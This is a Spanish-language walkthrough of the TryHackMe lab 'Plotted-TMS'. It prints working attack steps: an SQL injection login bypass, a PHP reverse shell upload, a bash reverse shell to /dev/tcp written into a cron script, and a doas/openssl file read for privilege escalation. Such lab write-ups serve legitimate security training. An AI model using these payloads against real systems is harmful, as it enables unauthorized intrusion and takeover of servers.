# Plotted - Easy

[Resolución THM](https://www.notion.so/Resoluci-n-THM-3918738286cb4cbdb08b4371e426b7b7)

## Introducción

La frase “Evereything here is plotted!” - “Todo aquí es un complot” y su referencia a Abraham Lincoln, hace alusión a “**Booth y sus conspiradores quienes planearon no solo matar a Lincoln, sino también a Grant, al secretario de Estado William Seward y al vicepresidente Andrew Johnson.”**

Se puede observar parte de la siguiente frase de Abraham Lincolm: “Give me six hours to chop down a tree and I will spend the first four sharpening the axe.” -  **“Dame seis horas para cortar un árbol y pasaré las primeras cuatro afilando el hacha”.**  

La máquina es diseñada por: [sa.infinity8888](https://tryhackme.com/p/sa.infinity8888). Es un reto con varios desafíos muy interesantes lo que demuestra el buen trabajo. 

Entre otros se van a tratar los siguientes temas:

- Nmap
- Burpsuite
- Linux
- Enumerción
- priv-esc

---

## Preparación

Creamos en nuestra carpeta de la máquina las siguientes carpetas de trabajo: 

- content
- exploits
- nmap
- scripts
- tmp

## Reconocimiento

- Nombre de la máquina:  Plotted-TMS-v3
- Dirección IP: 10.10.224.28
- Pueden acceder a la máquina dando clic [AQUÍ](https://tryhackme.com/room/plottedtms)
- Ingresamos desde el navegador al IP sin encontrar nada importante.

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled.png)

---

- Al realizar ping a la máquina, evidenciamos que por su “ttl = 63” nos estamos enfrentando a una máquina Linux, teniendo en cuenta la siguiente lista:
    - Linux/Unix: 64
    - Windows: 128
    - MacOS: 64
    - Solaris/AIX: 254

```
ping -c 1 10.10.224.28
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%201.png)

---

- Con el comando “whatweb”, podemos recolectar otro tipo de  información:

```
whatweb 10.10.224.28
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%202.png)

---

## Enumeración

- NMAP:  dentro de la carpeta de trabajo “nmap” y en formato grepeable “-oG”.

```
nmap -sCV 10.10.224.28 -oG ports
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%203.png)

---

Se encuentran los siguientes puertos abiertos: 

- 22 - ssh,
- 80 - http
- 445 - http

analizando estos puertos abiertos, debemos realizar el escaneo de 2 páginas web, por defecto la que responde al puerto 80 y una alterna por el puerto 445, en la siguiente imagen se observa que esta última está activa.

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%204.png)

---

- dirb: realizamos el escaneo de subdominios con el siguiente comando para los dos puertos; 80 y 445:

```
dirb http://10.10.224.28
dirb http://10.10.224.28:445
```

 

Resultado puerto 80:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%205.png)

---

- Resultados puerto 80: se encuentran los subdominios: admin,index, passwd, sever-status y shadown, despues de revisar estos subdominios se encuentran las siguientes pistas:
    
    
    - 10.10.224.228/admin: muestra un inex con el archivo id_rsa, que tiene adentro una cadena en formato base64, que al decodificarlo des de la página [base64decode.org](https://www.base64decode.org), nos damos cuenta que es una broma, como se evidencia a continuación:
    - 
    
    ![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%206.png)
    
    ![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%207.png)
    
    - 10.10.224.228/shadow: muestra una cadena en formato base64 que al decodificarlo des de la página [base64decode.org](https://www.base64decode.org), nos damos cuenta que es una broma, como se evidencia a continuación:
    
    ![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%208.png)
    
    ![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%209.png)
    

---

  

- gobuster: realizamos el escaneo de subdominios con el siguiente comando para los dos puertos; 80 y 445:

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.224.28

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.224.28:445
```

## Análisis de Vulnerabildades

Resultados de el escaneo en el puerto 445: se encontró la ruta “management”, la cual tiene una página con un inicio de sesión “login”:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2010.png)

Al realizar la revisión de vulnerabilidades asociadas al portal “Traffic Offense Management System” en  [exploit database](https://www.exploit-db.com/exploits/50221), encontramos que con el siguiente comando se pude realizar bypass al escribirlo como usuario y dejando el campo de password en blanco:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2011.png)

```
' OR 1=1-- '

```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2012.png)

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2013.png)

---

## Fase de Explotación

Después de analizar el portal, encontramos campos sin sanitizar, que permiten cargar archivos .php, lo que nos permite subir una “php-reverse-shell”, la cual descargamos del repositorio de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2014.png)

- Despues de descargada la configuramos con la IP correspondiente a la máquina del atacante y un puerto desocupado la guardamos con el nombre de su preferencia, para nuestro caso; “shell.php” en el directorio “exploits”, como se observa en la siguiente imagen:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2015.png)

- Ya con nuestra php-reverse-shell, procedemos a crear un nuevo “Drive” en el menú “Driver List” y en el campo “Photo” cargamos la shell creada, damos clic en “save”

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2016.png)

- Preparamos la máquina atacante para que escuche desde el puerto 1234 con el siguiente comando y desde la página web cargamos la imagen donte esta la reverse-shell y pa dentro.

```
nc -nlvp 1234
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2017.png)

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2018.png)

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2019.png)

Tenemos acceso como el usuario “www-data”, con el siguiente comando mejoramos la bash.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Análisis de Vulnerabildades

Dentro del servidor procedemos a buscar vulnerabilidades que nos permitan acceso a las flags.

- Listamos los procesos “crontab” con el siguiente comando:
    
    ```
    cat /etc/crontab
    ```
    
    ![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2020.png)
    
- Nos dirigimos a la ruta del script que puede ser ejecutado por el usuario “plot_admin” y listamos los permisos,

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2021.png)

- Examinamos el script y evidenciamos que este permite modificar y ejecutar sin restricción, procedemos a eliminar el archivo y crear uno con nuestro propio contenido.

```
rm backup-sh
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2022.png)

- Ejecutamos el siguiente comando para crear de nuevo el script backup.sh

```bash
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.9.0.47/44444 0>&1"' > backup.sh
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2023.png)

- Procedemos a conceder permisos de ejecucuón al script creado:

```bash
chmod +x backup.sh
```

- Lo ejecutamos con el siguiente comando:

```bash
date
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2024.png)

- Nos ponemos por escucha en el puerto “4444” previamente configurado y luego de pasado un minuto ganamos acceso como el usuario “plot_admin”

```bash
nc -nlvp 4444
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2025.png)

- En este punto tenemos acceso a la flag de usuario:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2026.png)

---

## Escalada de privilegios

- Analizamos los binarios que el usuario “plot_admin” puede ejecutar, con el siguiente comando,

```
find / -type f -perm -4000 2>/dev/null
```

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2027.png)

- Despues de analizar estos binarios encontramos una forma fácil de escalar privilegios desde la página [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation), donde nos indica la ruta para revisar; “/etc/doas.conf”

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2028.png)

- Revisamos la ruta y encontramos que “openssl” permite acceder a plot_admin como root:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2029.png)

- En la página [GTFObins](https://gtfobins.github.io/gtfobins/openssl/#sudo), podemos ver dos metodos para escalar privilegios, vamos a utilizar el método “File read”

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2030.png)

- A continuación describimos los pasos a seguir

```
LFILE=/root/root.txt
```

```
doas -u root openssl enc -in "$LFILE"
```

- Finalmente nos muestra la flag de root, y con esto finaliza esta interesante máquina:

![Untitled](Plotted%20-%20Easy%20f9aede33d2cd40dfa9c01fc0d009e1ff/Untitled%2031.png)

---

Eso es todo, feliz hack!

ocortes6.

Agracecimiento: [https://www.youtube.com/watch?v=pP94yXt4KYg](https://www.youtube.com/watch?v=pP94yXt4KYg)